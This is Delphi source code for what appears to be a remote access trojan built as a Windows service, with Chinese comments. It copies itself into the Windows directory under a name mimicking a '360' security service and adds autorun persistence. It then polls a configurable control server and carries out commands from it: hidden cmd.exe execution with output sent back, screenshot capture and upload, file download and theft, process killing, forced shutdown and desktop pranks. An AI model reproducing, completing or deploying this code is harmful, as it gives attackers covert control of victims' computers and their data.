unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, ShellAPI, Graphics, jpeg, Controls, SvcMgr, Dialogs,
  ExtCtrls;

  Function GET_SCREEN:String;
  Function RUN_CMD(cmd:String):String;
  Function TO_LINE(Go:String):String;


type
  TService1 = class(TService)
    TimerLine: TTimer;
    RUN_TIMER: TTimer;
    procedure TimerLineTimer(Sender: TObject);
    procedure RUN_TIMERTimer(Sender: TObject);
    procedure ServiceCreate(Sender: TObject);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  Service1: TService1;
  SerUrl: String;
  SerKey: String;
  ScreenW:Integer;
  ScreenH:Integer;

implementation

uses Unit_WinSys, Unit_Create, Unit_Funny, Unit_Helper, Unit_Http,
  Unit_Tasklist;

{$R *.DFM}

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  Service1.Controller(CtrlCode);
end;

function TService1.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;


procedure TService1.ServiceCreate(Sender: TObject);
var
  ZSpath : String;
  MBpath : String;
  MsgTip : String;
  SerFil : String;
  SerRun : String;
  SerRat : String;
  
begin
  ScreenW:=1024;
  ScreenH:=768;

  MsgTip := '{TIP}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //信息提示
  SerUrl := '{URL}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //服务地址
  SerFil := '{FIL}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //新文件名
  SerRun := '{RUN}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //是否写入注册表开机启动
  SerRat := '{RAT}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //是否写入计划开机启动
  SerKey := '{KEY}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'; //服务标识

  //清除多余空格
  MsgTip := Trim(MsgTip);
  SerUrl := Trim(SerUrl);
  SerFil := Trim(SerFil);
  SerRun := Trim(SerRun);
  SerRat := Trim(SerRat);
  SerKey := Trim(SerKey);

  //保证文件名不能为空
  if SerFil='' then begin
     SerFil:='360serveic';
  end;
  
  //ZSpath 自身路径
  ZSpath := LowerCase(ParamStr(0));
  MBpath := LowerCase('c:\windows\' + SerFil + '.exe');
  
  if ZSpath<>MBpath then begin
  
     //复制自身
     CopyFile(PChar(ZSpath),PChar(MBpath),False);

     //创建开机启动
     if SerRun='Y' then begin
        SET_AUTORUN('360ServeicV1.0',MBpath);
     end;

     //创建计划开机启动
     if SerRat='Y' then begin
        SET_AUTORUN('360ServeicV1.0',MBpath);
     end;

     //提示消息
     if MsgTip<>'' then begin
        showmessage(MsgTip);
     end;
     
  end;


end;


//Timer processing to drawing line
procedure TService1.TimerLineTimer(Sender: TObject);
var dc : hdc;
begin
  Dc := GetDc(0);
  MoveToEx(Dc,random(ScreenW),random(ScreenH), nil);
  LineTo(Dc,random(ScreenW),random(ScreenH));
end;

//Timer processing to deal with the command
procedure TService1.RUN_TIMERTimer(Sender: TObject);
var
RUN_STR,CMDKEY,CMDPR1,CMDPR2,CMDPR3,CMDMD5,RESULT:String;
RUNSTR:TStringList;
begin
   RUN_TIMER.Enabled:=false;
   //Get the command
   RUN_STR:=POST_DATA(SerUrl,SerKey,'','');
   if RUN_STR<>'' then
   RUN_STR:=Trim(RUN_STR);
   begin
      RUNSTR := TEXT_SPLIT(RUN_STR,'|');
      if RUNSTR.Count = 4 then
      begin
         CMDKEY := RUNSTR[0];
         CMDPR1 := RUNSTR[1];
         CMDPR2 := RUNSTR[2];
         CMDPR3 := RUNSTR[3];
         //---------
         CMDPR1 := Trim(CMDPR1);
         CMDPR2 := Trim(CMDPR2);
         CMDMD5 := CMDPR3;
         //---------
         if CMDKEY='GET_SCREEN' then RESULT:=GET_SCREEN;
         if CMDKEY='TO_BLACK'   then RESULT:=TO_BLACK;
         if CMDKEY='TASK_LIST'  then RESULT:=TASK_LIST;
         if CMDKEY='TASK_KILL'  then RESULT:=TASK_KILL(CMDPR1);
         if CMDKEY='TO_LINE'    then RESULT:=TO_LINE(CMDPR1);
         //---------
         if CMDKEY='OPEN_MSG'  then RESULT:=OPEN_MSG(CMDPR1);
         if CMDKEY='OPEN_WEB'  then RESULT:=OPEN_WEB(CMDPR1);
         if CMDKEY='RUN_CMD'   then RESULT:=RUN_CMD(CMDPR1);
         if CMDKEY='GET_DISK'  then RESULT:=GET_DISK;
         if CMDKEY='GET_RPATH' then RESULT:=GET_RPATH(CMDPR1);
         if CMDKEY='GET_RFILE' then RESULT:=GET_RFILE(SerUrl,CMDPR1);
         //---------
         if CMDKEY='CREATE_PATH' then RESULT:=CREATE_PATH(CMDPR1);
         if CMDKEY='CREATE_FILE' then RESULT:=CREATE_FILE(CMDPR1,CMDPR2);
         if CMDKEY='CREATE_DOWN' then RESULT:=CREATE_DOWN(CMDPR1,CMDPR2);
         //---------
         if CMDKEY='SYS_LOGOFF'   then ExitWindowsEx(EWX_LOGOFF,0);
         if CMDKEY='SYS_SHUTDOWN' then ShellExecute(0,'open','shutdown.exe',' -f -s -t 0',nil,SW_HIDE);
         if CMDKEY='SYS_REBOOT'   then ExitWindowsEx(EWX_REBOOT,2);
         //Completed and callback
         RESULT:=Trim(RESULT);
         POST_DATA(SerUrl,SerKey,CMDMD5,RESULT);
      end;
   end;
   RUN_TIMER.Enabled:=true;
end;


//Screen capture
Function GET_SCREEN:String;
var
  RectWidth,RectHeight:integer;
  SourceDC,DestDC,Bhandle:integer;
  Bitmap:TBitmap;
  MyJpeg:TJpegImage;
  Stream:TMemoryStream;
var LeftPos,TopPos,RightPos,BottomPos:integer;
begin
  LeftPos:=0;
  TopPos:=0;
  RightPos:=ScreenW;
  BottomPos:=ScreenH;
  MyJpeg:=TJpegImage.Create;
  RectWidth:=RightPos-LeftPos;
  RectHeight:=BottomPos-TopPos;
  SourceDC:=CreateDC('DISPLAY','','',nil);
  DestDC:=CreateCompatibleDC(SourceDC);
  Bhandle:=CreateCompatibleBitmap(SourceDC,
  RectWidth,RectHeight);
  SelectObject(DestDC,Bhandle);
  BitBlt(DestDC,0,0,RectWidth,RectHeight,SourceDC,
  LeftPos,TopPos,SRCCOPY);
  Bitmap:=TBitmap.Create;
  Bitmap.Handle:=BHandle;
  Stream:=TMemoryStream.Create;
  Bitmap.SaveToStream(Stream);
  Stream.Free;
  try
    MyJpeg.Assign(Bitmap);
    MyJpeg.CompressionQuality:=30;
    MyJpeg.Compress;
    MyJpeg.SaveToFile('c:\screen.jpg');
  finally
    MyJpeg.Free;
    Bitmap.Free;
    DeleteDC(DestDC);
    ReleaseDC(Bhandle,SourceDC);
  end;
  //Result:= TO_JSON('GET_SCREEN','1');
  Result:= GET_RFILE(SerUrl,'c:\screen.jpg');
end;


//Run cmd command
Function RUN_CMD(cmd:String):String;
var   
    S:TStartupInfo;
    P:TProcessInformation;
    Sec:TSecurityAttributes;
    read,write:THandle;
    buffer:array[0..5023] of char;
    byteread,aprun:DWORD;
    backcmd:String;   
begin
    Sec.nLength:=Sizeof(TSecurityAttributes);
    Sec.bInheritHandle:=True;
    Sec.lpSecurityDescriptor:=nil;
    if not CreatePipe(read,write,@Sec,0) then
       //Result:='Create Pipe Failed';Exit;
      Raise Exception.Create('create pipe failed');
      FillChar(S,Sizeof(TStartupInfo),0);
      S.cb:=Sizeof(TStartupInfo);
      S.wShowWindow:=SW_HIDE;
      S.dwFlags:=STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
      S.hStdOutput:=write;
      S.hStdError:=write;
      if not CreateProcess(nil,Pchar('cmd /c ' + cmd),nil,nil,True,NORMAL_PRIORITY_CLASS,nil,nil,S,P) then
         begin
           Result:='Cmd Process Failed!';
           Exit;
         end
      else
         begin
         repeat
           aprun:=WaitForSingleObject(P.hProcess,250);
           //Application.ProcessMessages;
         until aprun<>WAIT_TIMEOUT;
         repeat
           byteread:=0;
           ReadFile(read,buffer[0],5024,byteread,nil);
           backcmd := backcmd + string(buffer);
         until byteread<5023;
      end;
      CloseHandle(P.hProcess);
      CloseHandle(P.hThread);   
      CloseHandle(read);   
      CloseHandle(write);
      //Result:= TO_JSON('RUN_CMD',backcmd);
      Result:= backcmd;
End;

//Drawing line on the Desktop
Function TO_LINE(Go:String):String;
Begin
  if Go='1' then
     begin
       Service1.TimerLine.Enabled := true;
     end
  else
     begin
       Service1.TimerLine.Enabled := false;
  end;
  Service1.TimerLine.Interval := 10;
  Result:= '{"ok":"1"}';
End;


end.
